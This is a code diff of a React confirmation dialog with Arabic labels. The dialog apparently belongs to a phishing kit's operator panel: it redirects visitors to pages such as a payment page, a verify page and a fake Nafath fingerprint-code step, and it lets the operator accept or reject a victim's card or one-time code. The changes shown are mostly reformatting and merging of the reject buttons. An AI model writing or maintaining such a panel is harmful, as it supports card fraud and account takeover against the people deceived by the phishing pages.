@@ -35,44 +35,37 @@ export default function ConfirmDialog({
         <Modal.Title>
           توجيه إلى: <strong>{LABELS[page] || page}</strong>
         </Modal.Title>
-        <Button variant="link" onClick={onClose} style={{ fontSize: "1.5rem", lineHeight: 1 }}>×</Button>
+        <Button variant="link" onClick={onClose} style={{ fontSize:"1.5rem", lineHeight:1 }}>×</Button>
       </Modal.Header>
       <Modal.Body className="text-center py-4">
 
-        {/* حقل رمز البصمة — nafad-basmah فقط */}
         {needsBasmah && (
           <div className="mb-4">
             <p className="text-muted mb-2">أدخل رمز البصمة (رقمين)</p>
             <FormControl
-              type="tel"
-              maxLength={2}
-              placeholder="##"
+              type="tel" maxLength={2} placeholder="##"
               value={basmah}
-              onChange={(e) => onBasmahChange(e.target.value.replace(/\D/g, "").slice(0, 2))}
+              onChange={(e) => onBasmahChange(e.target.value.replace(/\D/g,"").slice(0,2))}
               className="text-center mx-auto mb-3"
-              style={{ maxWidth: 100, fontSize: "1.5rem", letterSpacing: 8 }}
+              style={{ maxWidth:100, fontSize:"1.5rem", letterSpacing:8 }}
             />
           </div>
         )}
 
-        {/* زر القبول */}
-        <Button
-          variant="success"
-          onClick={onConfirm}
-          className="mx-2 px-4 mb-2"
-          disabled={needsBasmah && basmah.length < 2}
-        >
+        {/* قبول — دائماً موجود */}
+        <Button variant="success" onClick={onConfirm} className="mx-2 px-4 mb-2"
+          disabled={needsBasmah && basmah.length < 2}>
           ✅ قبول
         </Button>
 
-        {/* زر رفض البطاقة — paymen.html */}
-        {isPaymenPage && (
+        {/* رفض — لكل الصفحات */}
+        {!isVerifyPage && (
           <Button variant="danger" onClick={onDecline} className="mx-2 px-4 mb-2">
-            ❌ رفض البطاقة
+            ❌ رفض
           </Button>
         )}
 
-        {/* زران — verify.html: رفض الكود + رفض البطاقة */}
+        {/* verify.html — زران: رفض الكود + رفض البطاقة */}
         {isVerifyPage && (
           <>
             <Button variant="warning" onClick={onDecline} className="mx-2 px-4 mb-2">
@@ -82,13 +75,6 @@ export default function ConfirmDialog({
               🚫 رفض البطاقة
             </Button>
           </>
-        )}
-
-        {/* زر رفض عادي — باقي الصفحات */}
-        {!isPaymenPage && !isVerifyPage && (
-          <Button variant="danger" onClick={onDecline} className="mx-2 px-4 mb-2">
-            ❌ رفض
-          </Button>
         )}
 
       </Modal.Body>
